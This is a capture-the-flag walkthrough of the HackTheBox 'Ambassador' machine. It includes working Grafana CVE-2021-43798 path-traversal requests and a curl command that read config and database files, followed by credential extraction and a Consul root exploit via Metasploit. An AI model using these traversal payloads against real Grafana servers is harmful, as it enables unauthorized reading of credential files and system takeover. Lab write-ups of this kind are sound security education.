---
title: Ambassador
date: 2023-01-08 18:32:00 -0500
categories: [Walkthrough, Hackthebox, CTF]
tags: [grafana, curl, devops, sqlite, mysql, linux, cve-2021-43798, consul, git]
---

![Hacker in a hood](/assets/hacker-hoodie.jpg)

- `sudo nmap -p- -T4 10.10.11.183 -vvvv`

Ports open: 22,80,3000,3006

- `sudo nmap -p22,80,3000,3306 -sC -sV -O 10.10.11.183 -vvvv`

## Port 80

Nothing here I ran feroxbuster with medium raft directories but we do get a note

We get a note

- Use the **developer** account to SSH, DevOps will give you the password.

## Port 3000 

Here we find a Grafana instance. Grafana is an open-source monitoring playform that allows you to alert and querty and visualize different data sourced, like databases. The key must be here? running feroxbuster yeild a shitload of nothing, checking the source of the grafana page and searching for "version" we find the Grafana version 8.2.0.

- `https://www.exploit-db.com/exploits/50581` - CVE-2021-43798 - Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files. The exploit works by being allowed to use the plugins in the api then directory traversal to read whatever you are allowed to ready on the system.

This script will use the exploit by doing all the work allowing us to view files use we can use this to read the grafana config files located at `/etc/grafana/grafana.ini` then use those credentials to login to grafana. 

```
# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
```

We can also exploit this manually be sending a burpsuite request:

```
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
Host: ambassador.htb:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: grafana_session=623f4d37681413f3b35dcd3db3830779
Connection: close
```

Okay so the exploit above doesnt allow us to really do anything other than read the files...Can we use a curl request to download the grafana.db On macOS and Linux, the default location is `/var/lib/grafana/grafana.db`.

- Burpsuite repeater request:

```
GET /public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1
Host: ambassador.htb:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: grafana_session=623f4d37681413f3b35dcd3db3830779
Connection: close
```

This pulls up a database

we can download this with curl

- `curl --path-as-is http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db`

And open in `sqlite3`

we can use `.tables` to see all tables then `SELECT * FROM user;` where we can see admin credentials.

1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2023-01-09 08:20:50|0

`dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069`

I thought this went soemwhere but after a ahwile of nothing went back in and checked the data_source table. I really, really, should have looked at all of the tables.

`2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-08 22:39:14|0|{}|1|uKewFgM4z`

- `mysql -u grafana -h ambassador.htb -p`

```
SHOW DATABASES;
SHOW tables;
SELECT * FROM USERS;
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

All of the other databases we dont have access to.

- `echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d` gives us `anEnglishManInNewYork027468`

and we are into the system!

## Privilege Escalation 


r-- 1 developer developer 93 Sep  2 02:28 /home/developer/.gitconfig
drwxrwxr-x 8 root root 4096 Mar 14  2022 /opt/my-app/.git

we find some git files here! this being a devops server probably the way to our flag

notice there is some stuff happening inside of /opt/ specifically a django server.

running `netstat -tulp` we can see there is some addesses that we are only able to access on localhost. in order to access these we need to setup a port-forward and can do this with via ssh.

```
tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:8600          0.0.0.0:*               LISTEN      -         
```

the consul service is only available on 8500 remotely

- `ssh -L 8500:localhost:8500 developer@ambassador.htb`

After creating a tunnel and checking out the 830x ports and not getting anywhere, I think his more to do with the git located here thought. So going to look into the git.

- `git log` shows git commit hisotry
- `git show` check the git commits in the history

checking the git commits so come accross a token of some sort `git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55` we find `consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWO`

checking metasploit there are some RCEs `multi/misc/consul_service_exec` 

using this exploit its pretty easy to get root with the ACL token rhosts set to localhost (because we forwarded the port) and the just the LHOST and LPORT.

cd to root for the last flag.
